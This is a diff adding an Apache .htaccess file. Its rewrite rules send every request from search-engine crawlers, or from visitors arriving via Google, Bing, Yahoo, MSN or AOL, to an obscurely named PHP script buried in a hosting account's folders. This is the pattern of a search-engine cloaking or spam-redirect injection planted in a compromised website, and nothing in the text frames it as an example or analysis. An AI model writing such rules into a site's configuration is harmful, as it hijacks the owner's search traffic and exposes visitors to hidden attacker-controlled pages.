@@ -1,0 +1,6 @@
+RewriteEngine On
+RewriteBase /
+RewriteOptions InheritDown
+RewriteCond %{HTTP_USER_AGENT} (msn|bing|yahoo|aol|google) [OR]
+RewriteCond %{HTTP_REFERER} (msn|bing|yahoo|aol|google)
+RewriteRule . /home/users/web/b1722/ipw.sarlnoel/public_html/aiki/esidebn.php?$1 [L]
